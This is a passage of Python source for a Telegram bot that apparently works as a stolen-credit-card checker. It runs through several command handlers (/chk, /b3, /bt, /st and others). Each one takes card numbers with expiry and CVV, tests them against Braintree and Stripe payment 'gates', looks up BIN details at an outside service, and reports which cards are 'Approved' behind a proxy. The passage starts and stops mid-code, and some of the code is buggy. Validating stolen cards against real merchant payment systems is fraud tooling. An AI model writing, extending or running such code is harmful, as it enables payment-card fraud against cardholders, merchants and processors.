        msg = f'''<b>𝗣𝗔𝗦𝗦𝗘𝗗  ✅ 
[❖] 𝗖𝗖 ⇾<code>{card}</code>
[❖] 𝗚𝗔𝗧𝗘𝗦 ⇾ {gate}
[❖] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 →{last}
━━━━━━━━━━━━━━━━
[❖] 𝗕𝗜𝗡 → <code>{card[:6]} - {card_type} - {brand}</code>
[❖] 𝗕𝗮𝗻𝗸  → {bank}
[❖] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 → <code>{country} - {country_flag}</code> 
━━━━━━━━━━━━━━━━
[❖] 𝗣𝗿𝗼𝘇𝘆 ⇾ 𝗟𝗶𝘃𝗲 [1XX.XX.XX 🟢]
[❖] 𝗧𝗶𝗺𝗲 𝗧𝗮𝗸𝗲𝗻 ⇾{"{:.1f}".format(execution_time)} secounds .
━━━━━━━━━━━━━━━━
[❖] 𝗕𝗼𝘁 𝗕𝘆 ⇾ 『@vickyisonlive1』</b>'''

        msgd = f'''<b>𝗥𝗘𝗝𝗘𝗖𝗧𝗘𝗗 ❌
[❖] 𝗖𝗖 ⇾<code>{card}</code>
[❖] 𝗚𝗔𝗧𝗘𝗦 ⇾ {gate}
[❖] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 →{last}
━━━━━━━━━━━━━━━━
[❖] 𝗕𝗜𝗡 → <code>{card[:6]} - {card_type} - {brand}</code>
[❖] 𝗕𝗮𝗻𝗸  → {bank}
[❖] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 → <code>{country} - {country_flag}</code> 
━━━━━━━━━━━━━━━━
[❖] 𝗣𝗿𝗼𝘇𝘆 ⇾ 𝗟𝗶𝘃𝗲 [1XX.XX.XX 🟢]
[❖] 𝗧𝗶𝗺𝗲 𝗧𝗮𝗸𝗲𝗻 ⇾{"{:.1f}".format(execution_time)} secounds .
━━━━━━━━━━━━━━━━
[❖] 𝗕𝗼𝘁 𝗕𝘆 ⇾ 『@vickyisonlive1』</b>'''

        if 'Authenticate Attempt Successful' in last or 'Authenticate Successful' in last or 'authenticate_successful' in last:
            results.append(msg)
            bot.send_message(message.chat.id, text = msg, parse_mode="HTML")
        else:
            results.append(msgd)
            bot.send_message(message.chat.id, text = msgd, parse_mode="HTML")

    # إرسال الرسائل لكل بطاقة
    for result in results:
        bot.send_message(message.chat.id, result, parse_mode="HTML")
@bot.message_handler(func=lambda message: message.text.lower().startswith('.chk') or message.text.lower().startswith('/chk'))
def respond_to_vbv(message):
	 with open('data.json') as f:
	   	data = json.load(f)
	   	user_id = str(message.from_user.id)
	   	if user_id not in data:
	   	   bot.reply_to(message, "You need to be registered to use this command.")
	   	   return
	 gate='𝗕𝗥𝗔𝗜𝗡𝗧𝗥𝗘𝗘 𝗔𝗨𝗧𝗛 '
	 name = message.from_user.first_name
	 idt=message.from_user.id
	 id=message.chat.id
	 try:command_usage[idt]['last_time']
	 except:command_usage[idt] = {
	    'last_time': datetime.now()
	   }
	 if command_usage[idt]['last_time'] is not None:
	  current_time = datetime.now()
	  time_diff = (current_time - command_usage[idt]['last_time']).seconds
	  if time_diff < 5:
	   bot.reply_to(message, f"<b>Try again after {5-time_diff} seconds.</b>",parse_mode="HTML")
	   return 
	 ko = (bot.reply_to(message, "𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨...⌛").message_id)
	 try:
	  cc = message.reply_to_message.text
	 except:
	  cc=message.text
	 cc=str(reg(cc))
	 if cc == 'None':
	  bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''<b>🚫 Oops!
	Please ensure you enter the card details in the correct format: غلطط
	Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
	  return
	 start_time = time.time()
	 try:
	  command_usage[idt]['last_time'] = datetime.now()
	  last = str(Tele(cc))
	 except Exception as e:
	  last='Error'
	 try: data = requests.get('https://bins.antipublic.cc/bins/'+cc[:6]).json()
	 except: pass
	 try:
	  brand = data['brand']
	 except:
	  brand = 'Unknown'
	 try:
	  card_type = data['type']
	 except:
	  card_type = 'Unknown'
	 try:
	  country = data['country_name']
	  country_flag = data['country_flag']
	 except:
	  country = 'Unknown'
	  country_flag = 'Unknown'
	 try:
	  bank = data['bank']
	 except:
	  bank = 'Unknown'
	 end_time = time.time()
	 execution_time = end_time - start_time
	 msg=f'''<b>𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 ✅
	   
[❖] 𝗖𝗖 ⇾<code>{cc}</code>
[❖] 𝗚𝗔𝗧𝗘𝗦 ⇾ {gate}
[❖] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 →{last}
━━━━━━━━━━━━━━━━
[❖] 𝗕𝗜𝗡 → <code>{cc[:6]} - {card_type} - {brand}</code>
[❖] 𝗕𝗮𝗻𝗸  → {bank}
[❖] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 → <code>{country} - {country_flag}</code> 
━━━━━━━━━━━━━━━━
[❖] 𝗣𝗿𝗼𝘅𝘆 ⇾ 𝗟𝗶𝘃𝗲 [1XX.XX.XX 🟢]
[❖] 𝗧𝗶𝗺𝗲 𝗧𝗮𝗸𝗲𝗻 ⇾{"{:.1f}".format(execution_time)} secounds .
━━━━━━━━━━━━━━━━
[❖] 𝗕𝗼𝘁 𝗕𝘆 ⇾『@vickyisonlive1』</b>'''
	     
	 msgd=f'''<b>𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙 ❌
	   
[❖] 𝗖𝗖 ⇾<code>{cc}</code>
[❖] 𝗚𝗔𝗧𝗘𝗦 ⇾ {gate}
[❖] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 →{last}
━━━━━━━━━━━━━━━━
[❖] 𝗕𝗜𝗡 → <code>{cc[:6]} - {card_type} - {brand}</code>
[❖] 𝗕𝗮𝗻𝗸  → {bank}
[❖] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 → <code>{country} - {country_flag}</code> 
━━━━━━━━━━━━━━━━
[❖] 𝗣𝗿𝗼𝘅𝘆 ⇾ 𝗟𝗶𝘃𝗲 [1XX.XX.XX 🟢]
[❖] 𝗧𝗶𝗺𝗲 𝗧𝗮𝗸𝗲𝗻 ⇾{"{:.1f}".format(execution_time)} secounds .
━━━━━━━━━━━━━━━━
[❖] 𝗕𝗼𝘁 𝗕𝘆 ⇾『@vickyisonlive1』</b>'''
	     
	 if "Funds" in last or 'Invalid postal' in last or 'avs' in last or 'added' in last or 'Duplicate' in last or 'Approved' in last:
	  bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg)
	 else:
	  bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msgd)
	  
	  
@bot.message_handler(func=lambda message: message.text.lower().startswith('.bb') or message.text.lower().startswith('/bb'))
def respond_to_vbv(message):
	 with open('data.json') as f:
	   	data = json.load(f)
	   	user_id = str(message.from_user.id)
	   	if user_id not in data:
	   	   bot.reply_to(message, "You need to be registered to use this command.")
	   	   return
	 gate='𝗕𝗥𝗔𝗜𝗡𝗧𝗥𝗘𝗘 𝗔𝗨𝗧𝗛 2 '
	 name = message.from_user.first_name
	 idt=message.from_user.id
	 id=message.chat.id
	 try:command_usage[idt]['last_time']
	 except:command_usage[idt] = {
	    'last_time': datetime.now()
	   }
	 if command_usage[idt]['last_time'] is not None:
	  current_time = datetime.now()
	  time_diff = (current_time - command_usage[idt]['last_time']).seconds
	  if time_diff < 5:
	   bot.reply_to(message, f"<b>Try again after {5-time_diff} seconds.</b>",parse_mode="HTML")
	   return 
	 ko = (bot.reply_to(message, "𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨...⌛").message_id)
	 try:
	  cc = message.reply_to_message.text
	 except:
	  cc=message.text
	 cc=str(reg(cc))
	 if cc == 'None':
	  bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''<b>🚫 Oops!
	Please ensure you enter the card details in the correct format: غلطط
	Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
	  return
	 start_time = time.time()
	 try:
	  command_usage[idt]['last_time'] = datetime.now()
	  last = str(bb(cc))
	 except Exception as e:
	  last='Error'
	 try: data = requests.get('https://bins.antipublic.cc/bins/'+cc[:6]).json()
	 except: pass
	 try:
	  brand = data['brand']
	 except:
	  brand = 'Unknown'
	 try:
	  card_type = data['type']
	 except:
	  card_type = 'Unknown'
	 try:
	  country = data['country_name']
	  country_flag = data['country_flag']
	 except:
	  country = 'Unknown'
	  country_flag = 'Unknown'
	 try:
	  bank = data['bank']
	 except:
	  bank = 'Unknown'
	 end_time = time.time()
	 execution_time = end_time - start_time
	 msg=f'''<b>𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 ✅
	   
[❖] 𝗖𝗖 ⇾<code>{cc}</code>
[❖] 𝗚𝗔𝗧𝗘𝗦 ⇾ {gate}
[❖] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 →{last}
━━━━━━━━━━━━━━━━
[❖] 𝗕𝗜𝗡 → <code>{cc[:6]} - {card_type} - {brand}</code>
[❖] 𝗕𝗮𝗻𝗸  → {bank}
[❖] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 → <code>{country} - {country_flag}</code> 
━━━━━━━━━━━━━━━━
[❖] 𝗣𝗿𝗼𝘅𝘆 ⇾ 𝗟𝗶𝘃𝗲 [1XX.XX.XX 🟢]
[❖] 𝗧𝗶𝗺𝗲 𝗧𝗮𝗸𝗲𝗻 ⇾{"{:.1f}".format(execution_time)} secounds .
━━━━━━━━━━━━━━━━
[❖] 𝗕𝗼𝘁 𝗕𝘆 ⇾『@vickyisonlive1』</b>'''
	     
	 msgd=f'''<b>𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙 ❌
	   
[❖] 𝗖𝗖 ⇾<code>{cc}</code>
[❖] 𝗚𝗔𝗧𝗘𝗦 ⇾ {gate}
[❖] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 →{last}
━━━━━━━━━━━━━━━━
[❖] 𝗕𝗜𝗡 → <code>{cc[:6]} - {card_type} - {brand}</code>
[❖] 𝗕𝗮𝗻𝗸  → {bank}
[❖] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 → <code>{country} - {country_flag}</code> 
━━━━━━━━━━━━━━━━
[❖] 𝗣𝗿𝗼𝘅𝘆 ⇾ 𝗟𝗶𝘃𝗲 [1XX.XX.XX 🟢]
[❖] 𝗧𝗶𝗺𝗲 𝗧𝗮𝗸𝗲𝗻 ⇾{"{:.1f}".format(execution_time)} secounds .
━━━━━━━━━━━━━━━━
[❖] 𝗕𝗼𝘁 𝗕𝘆 ⇾『@vickyisonlive1』</b>'''
	     
	 if "Funds" in last or 'Invalid postal' in last or 'avs' in last or 'added' in last or 'Duplicate' in last or 'Approved' in last:
	  bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg)
	 else:
	  bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msgd)
	  
@bot.message_handler(func=lambda message: message.text.lower().startswith('.b3') or message.text.lower().startswith('/b3'))
def respond_to_vbv(message):
	 with open('data.json') as f:
	   	data = json.load(f)
	   	user_id = str(message.from_user.id)
	   	if user_id not in data:
	   	   bot.reply_to(message, "You need to be registered to use this command.")
	   	   return
	 gate='𝗕𝗥𝗔𝗜𝗡𝗧𝗥𝗘𝗘 𝗔𝗨𝗧𝗛 3 '
	 name = message.from_user.first_name
	 idt=message.from_user.id
	 id=message.chat.id
	 try:command_usage[idt]['last_time']
	 except:command_usage[idt] = {
	    'last_time': datetime.now()
	   }
	 if command_usage[idt]['last_time'] is not None:
	  current_time = datetime.now()
	  time_diff = (current_time - command_usage[idt]['last_time']).seconds
	  if time_diff < 5:
	   bot.reply_to(message, f"<b>Try again after {5-time_diff} seconds.</b>",parse_mode="HTML")
	   return 
	 ko = (bot.reply_to(message, "𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨...⌛").message_id)
	 try:
	  cc = message.reply_to_message.text
	 except:
	  cc=message.text
	 cc=str(reg(cc))
	 if cc == 'None':
	  bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''<b>🚫 Oops!
	Please ensure you enter the card details in the correct format: غلطط
	Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
	  return
	 start_time = time.time()
	 try:
	  command_usage[idt]['last_time'] = datetime.now()
	  last = str(b3(cc))
	 except Exception as e:
	  last='Error'
	 try: data = requests.get('https://bins.antipublic.cc/bins/'+cc[:6]).json()
	 except: pass
	 try:
	  brand = data['brand']
	 except:
	  brand = 'Unknown'
	 try:
	  card_type = data['type']
	 except:
	  card_type = 'Unknown'
	 try:
	  country = data['country_name']
	  country_flag = data['country_flag']
	 except:
	  country = 'Unknown'
	  country_flag = 'Unknown'
	 try:
	  bank = data['bank']
	 except:
	  bank = 'Unknown'
	 end_time = time.time()
	 execution_time = end_time - start_time
	 msg=f'''<b>𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 ✅
	   
[❖] 𝗖𝗖 ⇾<code>{cc}</code>
[❖] 𝗚𝗔𝗧𝗘𝗦 ⇾ {gate}
[❖] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 →{last}
━━━━━━━━━━━━━━━━
[❖] 𝗕𝗜𝗡 → <code>{cc[:6]} - {card_type} - {brand}</code>
[❖] 𝗕𝗮𝗻𝗸  → {bank}
[❖] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 → <code>{country} - {country_flag}</code> 
━━━━━━━━━━━━━━━━
[❖] 𝗣𝗿𝗼𝘅𝘆 ⇾ 𝗟𝗶𝘃𝗲 [1XX.XX.XX 🟢]
[❖] 𝗧𝗶𝗺𝗲 𝗧𝗮𝗸𝗲𝗻 ⇾{"{:.1f}".format(execution_time)} secounds .
━━━━━━━━━━━━━━━━
[❖] 𝗕𝗼𝘁 𝗕𝘆 ⇾『@vickyisonlive1』</b>'''
	     
	 msgd=f'''<b>𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙 ❌
	   
[❖] 𝗖𝗖 ⇾<code>{cc}</code>
[❖] 𝗚𝗔𝗧𝗘𝗦 ⇾ {gate}
[❖] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 →{last}
━━━━━━━━━━━━━━━━
[❖] 𝗕𝗜𝗡 → <code>{cc[:6]} - {card_type} - {brand}</code>
[❖] 𝗕𝗮𝗻𝗸  → {bank}
[❖] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 → <code>{country} - {country_flag}</code> 
━━━━━━━━━━━━━━━━
[❖] 𝗣𝗿𝗼𝘅𝘆 ⇾ 𝗟𝗶𝘃𝗲 [1XX.XX.XX 🟢]
[❖] 𝗧𝗶𝗺𝗲 𝗧𝗮𝗸𝗲𝗻 ⇾{"{:.1f}".format(execution_time)} secounds .
━━━━━━━━━━━━━━━━
[❖] 𝗕𝗼𝘁 𝗕𝘆 ⇾『@vickyisonlive1』</b>'''
	     
	 if "Funds" in last or 'Invalid postal' in last or 'avs' in last or 'added' in last or 'Duplicate' in last or 'Approved' in last:
	  bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg)
	 else:
	  bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msgd)
	  
	  
@bot.message_handler(func=lambda message: message.text.lower().startswith('.bt') or message.text.lower().startswith('/bt'))
def respond_to_vbv(message):
	 with open('data.json') as f:
	   	data = json.load(f)
	   	user_id = str(message.from_user.id)
	   	if user_id not in data:
	   	   bot.reply_to(message, "You need to be registered to use this command.")
	   	   return
	 gate='BRAINTREE CHARGE '
	 name = message.from_user.first_name
	 idt=message.from_user.id
	 id=message.chat.id
	 try:command_usage[idt]['last_time']
	 except:command_usage[idt] = {
	    'last_time': datetime.now()
	   }
	 if command_usage[idt]['last_time'] is not None:
	  current_time = datetime.now()
	  time_diff = (current_time - command_usage[idt]['last_time']).seconds
	  if time_diff < 5:
	   bot.reply_to(message, f"<b>Try again after {5-time_diff} seconds.</b>",parse_mode="HTML")
	   return 
	 ko = (bot.reply_to(message, "𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨...⌛").message_id)
	 try:
	  cc = message.reply_to_message.text
	 except:
	  cc=message.text
	 cc=str(reg(cc))
	 if cc == 'None':
	  bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''<b>🚫 Oops!
	Please ensure you enter the card details in the correct format: غلطط
	Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
	  return
	 start_time = time.time()
	 try:
	  command_usage[idt]['last_time'] = datetime.now()
	  last = str(bt(cc))
	 except Exception as e:
	  last='Error'
	 try: data = requests.get('https://bins.antipublic.cc/bins/'+cc[:6]).json()
	 except: pass
	 try:
	  brand = data['brand']
	 except:
	  brand = 'Unknown'
	 try:
	  card_type = data['type']
	 except:
	  card_type = 'Unknown'
	 try:
	  country = data['country_name']
	  country_flag = data['country_flag']
	 except:
	  country = 'Unknown'
	  country_flag = 'Unknown'
	 try:
	  bank = data['bank']
	 except:
	  bank = 'Unknown'
	 end_time = time.time()
	 execution_time = end_time - start_time
	 msg=f'''<b>𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 ✅
	   
[❖] 𝗖𝗖 ⇾<code>{cc}</code>
[❖] 𝗚𝗔𝗧𝗘𝗦 ⇾ {gate}
[❖] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 →{last}
━━━━━━━━━━━━━━━━
[❖] 𝗕𝗜𝗡 → <code>{cc[:6]} - {card_type} - {brand}</code>
[❖] 𝗕𝗮𝗻𝗸  → {bank}
[❖] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 → <code>{country} - {country_flag}</code> 
━━━━━━━━━━━━━━━━
[❖] 𝗣𝗿𝗼𝘅𝘆 ⇾ 𝗟𝗶𝘃𝗲 [1XX.XX.XX 🟢]
[❖] 𝗧𝗶𝗺𝗲 𝗧𝗮𝗸𝗲𝗻 ⇾{"{:.1f}".format(execution_time)} secounds .
━━━━━━━━━━━━━━━━
[❖] 𝗕𝗼𝘁 𝗕𝘆 ⇾『@vickyisonlive1』</b>'''
	     
	 msgd=f'''<b>𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙 ❌
	   
[❖] 𝗖𝗖 ⇾<code>{cc}</code>
[❖] 𝗚𝗔𝗧𝗘𝗦 ⇾ {gate}
[❖] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 →{last}
━━━━━━━━━━━━━━━━
[❖] 𝗕𝗜𝗡 → <code>{cc[:6]} - {card_type} - {brand}</code>
[❖] 𝗕𝗮𝗻𝗸  → {bank}
[❖] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 → <code>{country} - {country_flag}</code> 
━━━━━━━━━━━━━━━━
[❖] 𝗣𝗿𝗼𝘅𝘆 ⇾ 𝗟𝗶𝘃𝗲 [1XX.XX.XX 🟢]
[❖] 𝗧𝗶𝗺𝗲 𝗧𝗮𝗸𝗲𝗻 ⇾{"{:.1f}".format(execution_time)} secounds .
━━━━━━━━━━━━━━━━
[❖] 𝗕𝗼𝘁 𝗕𝘆 ⇾『@vickyisonlive1』</b>'''
	     
	 if "Funds" in last or 'Invalid postal' in last or 'avs' in last or 'added' in last or 'Duplicate' in last or 'Approved' in last:
	  bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg)
	 else:
	  bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msgd)
	  
@bot.message_handler(func=lambda message: message.text.lower().startswith('.bc') or message.text.lower().startswith('/bc'))
def respond_to_vbv(message):
	 with open('data.json') as f:
	   	data = json.load(f)
	   	user_id = str(message.from_user.id)
	   	if user_id not in data:
	   	   bot.reply_to(message, "You need to be registered to use this command.")
	   	   return
	 gate='BRAINTREE CHARGE 2 '
	 name = message.from_user.first_name
	 idt=message.from_user.id
	 id=message.chat.id
	 try:command_usage[idt]['last_time']
	 except:command_usage[idt] = {
	    'last_time': datetime.now()
	   }
	 if command_usage[idt]['last_time'] is not None:
	  current_time = datetime.now()
	  time_diff = (current_time - command_usage[idt]['last_time']).seconds
	  if time_diff < 5:
	   bot.reply_to(message, f"<b>Try again after {5-time_diff} seconds.</b>",parse_mode="HTML")
	   return 
	 ko = (bot.reply_to(message, "𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨...⌛").message_id)
	 try:
	  cc = message.reply_to_message.text
	 except:
	  cc=message.text
	 cc=str(reg(cc))
	 if cc == 'None':
	  bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''<b>🚫 Oops!
	Please ensure you enter the card details in the correct format: غلطط
	Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
	  return
	 start_time = time.time()
	 try:
	  command_usage[idt]['last_time'] = datetime.now()
	  last = str(bc(cc))
	 except Exception as e:
	  last='Error'
	 try: data = requests.get('https://bins.antipublic.cc/bins/'+cc[:6]).json()
	 except: pass
	 try:
	  brand = data['brand']
	 except:
	  brand = 'Unknown'
	 try:
	  card_type = data['type']
	 except:
	  card_type = 'Unknown'
	 try:
	  country = data['country_name']
	  country_flag = data['country_flag']
	 except:
	  country = 'Unknown'
	  country_flag = 'Unknown'
	 try:
	  bank = data['bank']
	 except:
	  bank = 'Unknown'
	 end_time = time.time()
	 execution_time = end_time - start_time
	 msg=f'''<b>𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 ✅
	   
[❖] 𝗖𝗖 ⇾<code>{cc}</code>
[❖] 𝗚𝗔𝗧𝗘𝗦 ⇾ {gate}
[❖] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 →{last}
━━━━━━━━━━━━━━━━
[❖] 𝗕𝗜𝗡 → <code>{cc[:6]} - {card_type} - {brand}</code>
[❖] 𝗕𝗮𝗻𝗸  → {bank}
[❖] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 → <code>{country} - {country_flag}</code> 
━━━━━━━━━━━━━━━━
[❖] 𝗣𝗿𝗼𝘅𝘆 ⇾ 𝗟𝗶𝘃𝗲 [1XX.XX.XX 🟢]
[❖] 𝗧𝗶𝗺𝗲 𝗧𝗮𝗸𝗲𝗻 ⇾{"{:.1f}".format(execution_time)} secounds .
━━━━━━━━━━━━━━━━
[❖] 𝗕𝗼𝘁 𝗕𝘆 ⇾『@vickyisonlive1』</b>'''
	     
	 msgd=f'''<b>𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙 ❌
	   
[❖] 𝗖𝗖 ⇾<code>{cc}</code>
[❖] 𝗚𝗔𝗧𝗘𝗦 ⇾ {gate}
[❖] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 →{last}
━━━━━━━━━━━━━━━━
[❖] 𝗕𝗜𝗡 → <code>{cc[:6]} - {card_type} - {brand}</code>
[❖] 𝗕𝗮𝗻𝗸  → {bank}
[❖] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 → <code>{country} - {country_flag}</code> 
━━━━━━━━━━━━━━━━
[❖] 𝗣𝗿𝗼𝘅𝘆 ⇾ 𝗟𝗶𝘃𝗲 [1XX.XX.XX 🟢]
[❖] 𝗧𝗶𝗺𝗲 𝗧𝗮𝗸𝗲𝗻 ⇾{"{:.1f}".format(execution_time)} secounds .
━━━━━━━━━━━━━━━━
[❖] 𝗕𝗼𝘁 𝗕𝘆 ⇾『@vickyisonlive1』</b>'''
	     
	 if "Funds" in last or 'Invalid postal' in last or 'avs' in last or 'added' in last or 'Duplicate' in last or 'Approved' in last:
	  bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg)
	 else:
	  bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msgd)
	  
	  
def load_data():
    try:
        with open('data.json') as f:
            return json.load(f)
    except json.JSONDecodeError as e:
        print(f"Error reading JSON file: {e}")
        return {}

# Initialize data and command_usage
data = load_data()
command_usage = {}

@bot.message_handler(func=lambda message: message.text.lower().startswith('.st') or message.text.lower().startswith('/st'))
def respond_to_st(message):
    global data
    user_id = str(message.from_user.id)
    
    # Check if user is registered
    if user_id not in data:
        bot.reply_to(message, "You need to be registered to use this command.")
        return
    
    gate = 'Stripe Auth '
    name = message.from_user.first_name
    idt = message.from_user.id
    id = message.chat.id

    # Check last command usage time
    if idt not in command_usage:
        command_usage[idt] = {'last_time': datetime.now()}
    
    current_time = datetime.now()
    time_diff = (current_time - command_usage[idt]['last_time']).seconds
    
    if time_diff < 15:
        bot.reply_to(message, f"<b>Try again after {15 - time_diff} seconds.</b>", parse_mode="HTML")
        return
    
    ko = bot.reply_to(message, "𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨...⌛").message_id
    
    try:
        cc = message.reply_to_message.text
    except AttributeError:
        cc = message.text
    
    cc = str(reg(cc))
    if cc == 'None':
        bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''<b>🚫 Oops!
Please ensure you enter the card details in the correct format:غلططط
Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''', parse_mode="HTML")
        return
    
    start_time = time.time()
    
    try:
        command_usage[idt]['last_time'] = datetime.now()
        last = str(st(cc))
    except Exception as e:
        print(f"Error processing command: {e}")
        last = 'Error'
    
    # Get card info from data.json or API
    bin_info = data.get(cc[:6], {})
    
    if not bin_info:
        try:
            bin_info = requests.get(f'https://bins.antipublic.cc/bins/{cc[:6]}').json()
        except Exception as e:
            print(f"Error fetching BIN info: {e}")
    
    brand = bin_info.get('brand', 'Unknown')
    card_type = bin_info.get('type', 'Unknown')
    country = bin_info.get('country_name', 'Unknown')
    country_flag = bin_info.get('country_flag', 'Unknown')
    bank = bin_info.get('bank', 'Unknown')
    
    end_time = time.time()
    execution_time = end_time - start_time
    
    msg = f'''<b>𝗔ρρяσνє𝗗 ✅
[❖] 𝗖𝗖 ⇾<code>{cc}</code>
[❖] 𝗚𝗔𝗧𝗘𝗦 ⇾ {gate}
[❖] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 →{last}
━━━━━━━━━━━━━━━━
[❖] 𝗕𝗜𝗡 → <code>{cc[:6]} - {card_type} - {brand}</code>
[❖] 𝗕𝗮𝗻𝗸 → {bank}
[❖] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 → {country} {country_flag}
━━━━━━━━━━━━━━━━
[❖] 𝗧𝗶𝗺𝗲 → {execution_time:.2f} 𝗦𝗲𝗰
━━━━━━━━━━━━━━━━
𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 → @{message.from_user.username} ✔</b>'''

    bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg, parse_mode="HTML")


@bot.message_handler(func=lambda message: message.text.lower().startswith('.cc') or message.text.lower().startswith('/cc'))
def respond_to_st(message):
    global data
    user_id = str(message.from_user.id)
    
    # Check if user is registered
    if user_id not in data:
        bot.reply_to(message, "You need to be registered to use this command.")
        return
    
    gate = 'Stripe Auth '
    name = message.from_user.first_name
    idt = message.from_user.id
    id = message.chat.id

    # Check last command usage time
    if idt not in command_usage:
        command_usage[idt] = {'last_time': datetime.now()}
    
    current_time = datetime.now()
    time_diff = (current_time - command_usage[idt]['last_time']).seconds
    
    if time_diff < 15:
        bot.reply_to(message, f"<b>Try again after {15 - time_diff} seconds.</b>", parse_mode="HTML")
        return
    
    ko = bot.reply_to(message, "𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨...⌛").message_id
    
    try:
        cc = message.reply_to_message.text
    except AttributeError:
        cc = message.text
    
    cc = str(reg(cc))
    if cc == 'None':
        bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''<b>🚫 Oops!
Please ensure you enter the card details in the correct format:غلططط
Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''', parse_mode="HTML")
        return
    
    start_time = time.time()
    
    try:
        command_usage[idt]['last_time'] = datetime.now()
        last = str(cc(cc))
    except Exception as e:
        print(f"Error processing command: {e}")
        last = 'Error'
    
    # Get card info from data.json or API
    bin_info = data.get(cc[:6], {})
    
    if not bin_info:
        try:
            bin_info = requests.get(f'https://bins.antipublic.cc/bins/{cc[:6]}').json()
        except Exception as e:
            print(f"Error fetching BIN info: {e}")
    
    brand = bin_info.get('brand', 'Unknown')
    card_type = bin_info.get('type', 'Unknown')
    country = bin_info.get('country_name', 'Unknown')
    country_flag = bin_info.get('country_flag', 'Unknown')
    bank = bin_info.get('bank', 'Unknown')
    
    end_time = time.time()
    execution_time = end_time - start_time
    
    msg = f'''<b>𝗔ρρяσνє𝗗 ✅
[❖] 𝗖𝗖 ⇾<code>{cc}</code>
[❖] 𝗚𝗔𝗧𝗘𝗦 ⇾ {gate}
[❖] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 →{last}
━━━━━━━━━━━━━━━━
[❖] 𝗕𝗜𝗡 → <code>{cc[:6]} - {card_type} - {brand}</code>
[❖] 𝗕𝗮𝗻𝗸 → {bank}
[❖] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 → {country} {country_flag}
━━━━━━━━━━━━━━━━
[❖] 𝗧𝗶𝗺𝗲 → {execution_time:.2f} 𝗦𝗲𝗰
━━━━━━━━━━━━━━━━
